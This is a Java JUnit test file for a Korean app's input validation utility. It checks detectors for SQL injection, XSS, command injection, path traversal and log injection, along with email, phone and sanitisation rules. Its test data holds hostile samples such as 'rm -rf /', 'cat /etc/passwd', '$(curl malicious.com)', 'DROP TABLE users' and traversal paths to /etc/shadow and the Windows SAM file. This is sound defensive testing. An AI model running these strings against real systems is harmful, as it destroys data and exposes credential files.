package com.Hamalog.security.validation;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@ExtendWith(MockitoExtension.class)
@DisplayName("Input Validation Util Tests")
class InputValidationUtilTest {

    private InputValidationUtil inputValidationUtil;

    @BeforeEach
    void setUp() {
        inputValidationUtil = new InputValidationUtil();
    }

    @Test
    @DisplayName("Should validate safe input successfully")
    void isValidInput_SafeInput_ShouldReturnTrue() {
        // given
        String safeInput = "안전한 입력값 123 test@example.com";
        
        // when
        boolean result = inputValidationUtil.isValidInput(safeInput);
        
        // then
        assertThat(result).isTrue();
    }

    @Test
    @DisplayName("Should allow empty input")
    void isValidInput_EmptyInput_ShouldReturnTrue() {
        // given
        String emptyInput = "";
        String nullInput = null;
        String whitespaceInput = "   ";
        
        // when & then
        assertThat(inputValidationUtil.isValidInput(emptyInput)).isTrue();
        assertThat(inputValidationUtil.isValidInput(nullInput)).isTrue();
        assertThat(inputValidationUtil.isValidInput(whitespaceInput)).isTrue();
    }

    @Test
    @DisplayName("Should detect SQL injection patterns")
    void containsSqlInjection_MaliciousInput_ShouldReturnTrue() {
        // given - patterns that contain SQL keywords from the regex
        String[] sqlInjectionInputs = {
            "1'; DROP TABLE users; --",
            "'; SELECT * FROM passwords; --",
            "UNION SELECT username, password FROM users",
            "1' UNION SELECT null,null,null--",
            "'; INSERT INTO logs VALUES('hacked'); --",
            "DELETE FROM users WHERE id=1",
            "CREATE TABLE malicious AS SELECT * FROM users",
            "UPDATE users SET password='hacked'"
        };
        
        // when & then
        for (String input : sqlInjectionInputs) {
            assertThat(inputValidationUtil.containsSqlInjection(input))
                .as("Should detect SQL injection in: %s", input)
                .isTrue();
        }
    }

    @Test
    @DisplayName("Should not detect SQL injection in inputs without keywords")
    void containsSqlInjection_InputWithoutKeywords_ShouldReturnFalse() {
        // given - patterns that look like SQL injection but don't contain keywords
        String[] nonSqlInputs = {
            "admin' OR '1'='1",  // No SQL keywords
            "user'; --",         // No SQL keywords
            "' OR 1=1 --"       // No SQL keywords
        };
        
        // when & then
        for (String input : nonSqlInputs) {
            assertThat(inputValidationUtil.containsSqlInjection(input))
                .as("Should not detect SQL injection in: %s", input)
                .isFalse();
        }
    }

    @Test
    @DisplayName("Should not detect SQL injection in safe input")
    void containsSqlInjection_SafeInput_ShouldReturnFalse() {
        // given
        String[] safeInputs = {
            "일반 텍스트",
            "user123@email.com",
            "010-1234-5678",
            "한글과 영어 mixed text",
            "숫자 123456"
        };
        
        // when & then
        for (String input : safeInputs) {
            assertThat(inputValidationUtil.containsSqlInjection(input))
                .as("Should not detect SQL injection in: %s", input)
                .isFalse();
        }
    }

    @Test
    @DisplayName("Should detect XSS patterns")
    void containsXss_MaliciousInput_ShouldReturnTrue() {
        // given
        String[] xssInputs = {
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "eval(alert('XSS'))",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>"
        };
        
        // when & then
        for (String input : xssInputs) {
            assertThat(inputValidationUtil.containsXss(input))
                .as("Should detect XSS in: %s", input)
                .isTrue();
        }
    }

    @Test
    @DisplayName("Should not detect XSS in safe input")
    void containsXss_SafeInput_ShouldReturnFalse() {
        // given
        String[] safeInputs = {
            "일반 텍스트 입력",
            "이메일 주소 test@example.com",
            "전화번호 010-1234-5678",
            "< 이것은 단순 비교 연산자",
            "> 이것도 단순 비교 연산자"
        };
        
        // when & then
        for (String input : safeInputs) {
            assertThat(inputValidationUtil.containsXss(input))
                .as("Should not detect XSS in: %s", input)
                .isFalse();
        }
    }

    @Test
    @DisplayName("Should detect command injection patterns")
    void containsCommandInjection_MaliciousInput_ShouldReturnTrue() {
        // given
        String[] commandInjectionInputs = {
            "filename; rm -rf /",
            "input | cat /etc/passwd",
            "file && rm important.txt",
            "$(curl malicious.com)",
            "`whoami`",
            "input > /dev/null",
            "file < input.txt"
        };
        
        // when & then
        for (String input : commandInjectionInputs) {
            assertThat(inputValidationUtil.containsCommandInjection(input))
                .as("Should detect command injection in: %s", input)
                .isTrue();
        }
    }

    @Test
    @DisplayName("Should detect path traversal patterns")
    void containsPathTraversal_MaliciousInput_ShouldReturnTrue() {
        // given
        String[] pathTraversalInputs = {
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/var/log/../../etc/shadow",
            "file/../../sensitive.txt",
            "..\\..\\.\\config"
        };
        
        // when & then
        for (String input : pathTraversalInputs) {
            assertThat(inputValidationUtil.containsPathTraversal(input))
                .as("Should detect path traversal in: %s", input)
                .isTrue();
        }
    }

    @Test
    @DisplayName("Should detect log injection patterns")
    void containsLogInjection_MaliciousInput_ShouldReturnTrue() {
        // given
        String[] logInjectionInputs = {
            "user\nADMIN LOGIN SUCCESSFUL",
            "input\rFAKE LOG ENTRY",
            "data\tTAB INJECTION",
            "text\u0000NULL_BYTE",
            "input\u001fCONTROL_CHAR"
        };
        
        // when & then
        for (String input : logInjectionInputs) {
            assertThat(inputValidationUtil.containsLogInjection(input))
                .as("Should detect log injection in: %s", input)
                .isTrue();
        }
    }

    @Test
    @DisplayName("Should validate email format correctly")
    void isValidEmail_VariousFormats_ShouldValidateCorrectly() {
        // given
        String[] validEmails = {
            "test@example.com",
            "user.name@domain.co.kr",
            "admin+label@company.org",
            "number123@test.net"
        };
        
        String[] invalidEmails = {
            "invalid-email",
            "@domain.com",
            "user@",
            "user@@domain.com",
            "user@domain",
            ""
        };
        
        // when & then
        for (String email : validEmails) {
            assertThat(inputValidationUtil.isValidEmail(email))
                .as("Should validate email: %s", email)
                .isTrue();
        }
        
        for (String email : invalidEmails) {
            assertThat(inputValidationUtil.isValidEmail(email))
                .as("Should invalidate email: %s", email)
                .isFalse();
        }
    }

    @Test
    @DisplayName("Should validate phone number format correctly")
    void isValidPhoneNumber_VariousFormats_ShouldValidateCorrectly() {
        // given
        String[] validPhones = {
            "010-1234-5678",
            "011-123-4567",
            "016-1234-5678",
            "017-123-4567",
            "018-1234-5678",
            "019-123-4567"
        };
        
        String[] invalidPhones = {
            "010-12345-678",
            "02-1234-5678",
            "010-123-45678",
            "010123456789",
            "010-abc-defg",
            ""
        };
        
        // when & then
        for (String phone : validPhones) {
            assertThat(inputValidationUtil.isValidPhoneNumber(phone))
                .as("Should validate phone: %s", phone)
                .isTrue();
        }
        
        for (String phone : invalidPhones) {
            assertThat(inputValidationUtil.isValidPhoneNumber(phone))
                .as("Should invalidate phone: %s", phone)
                .isFalse();
        }
    }

    @Test
    @DisplayName("Should validate length correctly")
    void isValidLength_VariousLengths_ShouldValidateCorrectly() {
        // given
        String shortText = "abc";
        String mediumText = "abcdefghij";
        String longText = "abcdefghijklmnopqrstuvwxyz";
        
        // when & then
        assertThat(inputValidationUtil.isValidLength(shortText, 1, 5)).isTrue();
        assertThat(inputValidationUtil.isValidLength(mediumText, 5, 15)).isTrue();
        assertThat(inputValidationUtil.isValidLength(longText, 20, 30)).isTrue();
        
        assertThat(inputValidationUtil.isValidLength(shortText, 5, 10)).isFalse();
        assertThat(inputValidationUtil.isValidLength(longText, 1, 10)).isFalse();
        assertThat(inputValidationUtil.isValidLength(null, 1, 10)).isFalse();
    }

    @Test
    @DisplayName("Should sanitize for log correctly")
    void sanitizeForLog_VariousInputs_ShouldSanitizeCorrectly() {
        // given
        String inputWithNewlines = "user\nfake log entry\rmore fake";
        String inputWithTabs = "data\twith\ttabs";
        String inputWithControlChars = "text\u0000with\u001fcontrol";
        
        // when
        String sanitized1 = inputValidationUtil.sanitizeForLog(inputWithNewlines);
        String sanitized2 = inputValidationUtil.sanitizeForLog(inputWithTabs);
        String sanitized3 = inputValidationUtil.sanitizeForLog(inputWithControlChars);
        
        // then
        assertThat(sanitized1).doesNotContain("\n", "\r");
        assertThat(sanitized2).doesNotContain("\t");
        assertThat(sanitized3).doesNotContain("\u0000", "\u001f");
        assertThat(sanitized1).contains("user", "fake log entry", "more fake");
    }

    @Test
    @DisplayName("Should sanitize for HTML correctly")
    void sanitizeForHtml_VariousInputs_ShouldSanitizeCorrectly() {
        // given
        String inputWithHtml = "<script>alert('xss')</script>normal text";
        String inputWithSpecialChars = "text with & < > \" ' chars";
        
        // when
        String sanitized1 = inputValidationUtil.sanitizeForHtml(inputWithHtml);
        String sanitized2 = inputValidationUtil.sanitizeForHtml(inputWithSpecialChars);
        
        // then
        assertThat(sanitized1).doesNotContain("<script>", "</script>");
        assertThat(sanitized1).contains("normal text");
        assertThat(sanitized2).contains("&amp;", "&lt;", "&gt;", "&quot;", "&#x27;");
    }

    @Test
    @DisplayName("Should sanitize file name correctly")
    void sanitizeFileName_VariousInputs_ShouldSanitizeCorrectly() {
        // given
        String dangerousFileName = "../../../etc/passwd";
        String fileNameWithSpecialChars = "file:name<with>special|chars?.txt";
        String normalFileName = "normal_file.txt";
        
        // when
        String sanitized1 = inputValidationUtil.sanitizeFileName(dangerousFileName);
        String sanitized2 = inputValidationUtil.sanitizeFileName(fileNameWithSpecialChars);
        String sanitized3 = inputValidationUtil.sanitizeFileName(normalFileName);
        
        // then
        assertThat(sanitized1).doesNotContain("../");
        assertThat(sanitized2).doesNotContain(":", "<", ">", "|", "?");
        assertThat(sanitized3).isEqualTo(normalFileName);
    }

    @Test
    @DisplayName("Should throw exception for invalid input validation")
    void validateInput_InvalidInput_ShouldThrowException() {
        // given
        String maliciousInput = "<script>alert('xss')</script>";
        
        // when & then
        assertThatThrownBy(() -> inputValidationUtil.validateInput(maliciousInput, "testField"))
            .isInstanceOf(InputValidationUtil.InputValidationException.class)
            .hasMessageContaining("testField")
            .hasMessageContaining("유효하지 않은 입력값");
    }

    @Test
    @DisplayName("Should not throw exception for valid input validation")
    void validateInput_ValidInput_ShouldNotThrowException() {
        // given
        String safeInput = "안전한 입력값 123";
        
        // when & then
        inputValidationUtil.validateInput(safeInput, "testField");
        // No exception should be thrown
    }

    @Test
    @DisplayName("Should throw exception for invalid email validation")
    void validateEmail_InvalidEmail_ShouldThrowException() {
        // given
        String invalidEmail = "invalid-email-format";
        
        // when & then
        assertThatThrownBy(() -> inputValidationUtil.validateEmail(invalidEmail))
            .isInstanceOf(InputValidationUtil.InputValidationException.class)
            .hasMessageContaining("유효하지 않은 이메일");
    }

    @Test
    @DisplayName("Should throw exception for invalid phone number validation")
    void validatePhoneNumber_InvalidPhone_ShouldThrowException() {
        // given
        String invalidPhone = "invalid-phone-format";
        
        // when & then
        assertThatThrownBy(() -> inputValidationUtil.validatePhoneNumber(invalidPhone))
            .isInstanceOf(InputValidationUtil.InputValidationException.class)
            .hasMessageContaining("유효하지 않은 전화번호");
    }

    @Test
    @DisplayName("Should handle null inputs gracefully")
    void variousMethods_NullInput_ShouldHandleGracefully() {
        // when & then
        assertThat(inputValidationUtil.containsSqlInjection(null)).isFalse();
        assertThat(inputValidationUtil.containsXss(null)).isFalse();
        assertThat(inputValidationUtil.containsCommandInjection(null)).isFalse();
        assertThat(inputValidationUtil.containsPathTraversal(null)).isFalse();
        assertThat(inputValidationUtil.containsLogInjection(null)).isFalse();
        assertThat(inputValidationUtil.isValidEmail(null)).isFalse();
        assertThat(inputValidationUtil.isValidPhoneNumber(null)).isFalse();
        // Sanitization methods return the original input (null) when input has no text
        assertThat(inputValidationUtil.sanitizeForLog(null)).isNull();
        assertThat(inputValidationUtil.sanitizeForHtml(null)).isNull();
        assertThat(inputValidationUtil.sanitizeFileName(null)).isNull();
    }

    @Test
    @DisplayName("Should handle edge case inputs")
    void variousMethods_EdgeCaseInputs_ShouldHandleProperly() {
        // given
        String veryLongString = "a".repeat(10000);
        String unicodeStringWithEmoji = "테스트 🚀 emoji 한글 test";  // Emoji not in SAFE_STRING_PATTERN
        String unicodeStringSafe = "테스트 한글 test";  // Only safe Korean characters
        String spacesOnly = "     ";
        
        // when & then
        // Unicode with emoji should be invalid due to SAFE_STRING_PATTERN restriction
        assertThat(inputValidationUtil.isValidInput(unicodeStringWithEmoji)).isFalse();
        // Korean characters without emoji should be valid
        assertThat(inputValidationUtil.isValidInput(unicodeStringSafe)).isTrue();
        assertThat(inputValidationUtil.sanitizeForLog(veryLongString)).isNotEmpty();
        assertThat(inputValidationUtil.sanitizeForHtml(spacesOnly)).isEqualTo(spacesOnly);
    }
}